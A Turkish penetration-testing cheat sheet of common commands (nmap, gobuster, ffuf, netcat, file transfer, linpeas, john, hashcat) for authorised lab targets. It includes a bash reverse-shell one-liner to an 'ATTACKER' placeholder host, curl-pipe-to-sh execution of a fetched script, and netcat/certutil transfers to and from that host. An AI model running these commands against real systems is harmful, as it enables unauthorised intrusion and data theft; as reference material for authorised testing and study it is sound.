# Sık kullanılan komutlar

🇬🇧 [English](common-commands.md)

Çalışma notları. `TARGET` / `ATTACKER` yerine gerçek IP'leri yaz. Yalnızca yetkili hedeflerde kullan.
Aşağıdaki wordlist yolları Kali'ye aittir; diğer sistemlerde farklıdır.

## nmap

```bash
nmap -p- --min-rate 1000 -oA nmap/allports TARGET     # tüm TCP portları, hızlı
nmap -sC -sV -p 22,80 -oA nmap/targeted TARGET        # açık portlarda varsayılan scriptler + sürümler
nmap -Pn TARGET                                       # host keşfini atla (host ping'i engelliyor)
nmap -sU --top-ports 20 TARGET                        # UDP, en yaygın 20 (yavaş, root ister)
nmap --script vuln -p 80 TARGET                       # NSE zafiyet scriptleri (gürültülü)
```

`-oA` normal, grep'lenebilir ve XML çıktı yazar. Root olarak çalışınca varsayılan tarama `-sS` (SYN taraması).

## Dizin / vhost brute force

```bash
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 30
gobuster vhost -u http://example.test -w subdomains.txt --append-domain   # gobuster >= 3.6

ffuf -u http://TARGET/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.txt -fc 404
ffuf -u http://TARGET/ -H "Host: FUZZ.example.test" -w subdomains.txt -fs 1234   # boyuta göre filtrele
ffuf -u 'http://TARGET/page?FUZZ=1' -w params.txt -fs 1234                       # parametre adları
```

`-fc` durum kodunu, `-fs` cevap boyutunu filtreler. Önce "normal" boyutu bul, sonra filtrele.

## netcat ve shell'ler

```bash
nc -lvnp 4444                       # ATTACKER'da dinleyici (-l dinle, -v ayrıntılı, -n DNS yok, -p port)
nc -vz TARGET 80                    # port açık mı?

# hedefte çalıştırılacak reverse shell tek satırı (bash)
bash -c 'bash -i >& /dev/tcp/ATTACKER/4444 0>&1'
```

Bağlantı geldikten sonra hedefteki shell'i stabilize et:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl+Z ile arka plana at, sonra kendi makinende:
stty raw -echo; fg
# shell'e dönünce:
export TERM=xterm
```

## Basit web sunucusu (hedefe dosya sunmak için)

```bash
python3 -m http.server 8000                    # geçerli dizini tüm arayüzlerde sunar
python3 -m http.server 8000 --bind ATTACKER    # yalnızca tek arayüzde (ör. VPN adresi)
```

## Dosya aktarımı

```bash
# hedef, ATTACKER'ın http.server'ından indirir
wget http://ATTACKER:8000/file -O /tmp/file
curl http://ATTACKER:8000/file -o /tmp/file

# netcat: önce alıcı, sonra gönderici
nc -lvnp 9001 > file            # alıcı
nc ATTACKER 9001 < file         # gönderici (takılırsa -q 1 / -N ekle, netcat sürümüne bağlı)

# scp (SSH erişimi gerekir)
scp user@TARGET:/path/file .

# hiç araç yoksa: terminal üzerinden base64, sonra çöz
base64 -w0 file                 # çıktıyı kopyala
echo 'YAPISTIR' | base64 -d > file

# bütünlüğü doğrula
sha256sum file
```

Windows hedef (PowerShell / cmd):

```powershell
Invoke-WebRequest -Uri http://ATTACKER:8000/file -OutFile C:\Windows\Temp\file
certutil -urlcache -split -f http://ATTACKER:8000/file file
```

## linpeas (Linux numaralandırma scripti)

```bash
# ATTACKER'da: bir kez indir, sonra sun
wget https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
python3 -m http.server 8000

# TARGET'ta: diske yazmadan çalıştır veya çıktıyı sonra okumak için kaydet
curl http://ATTACKER:8000/linpeas.sh | sh
# veya
curl http://ATTACKER:8000/linpeas.sh -o /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh | tee /tmp/linpeas.out
```

Önce kırmızı/sarı bulgulara bak, sonra her birini elle doğrula. Script yalnızca işaret eder;
anlamak senin işin.

## Kırma ve çeşitli

```bash
searchsploit apache 2.4.49              # çevrimdışı Exploit-DB araması
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt   # -m 0 = MD5; modu `hashcat --help`'ten bul
ssh -i id_rsa user@TARGET               # anahtar dosyası chmod 600 olmalı
ssh -L 8080:127.0.0.1:80 user@TARGET    # yerel 8080'i hedefin yerel 80 portuna yönlendir
```
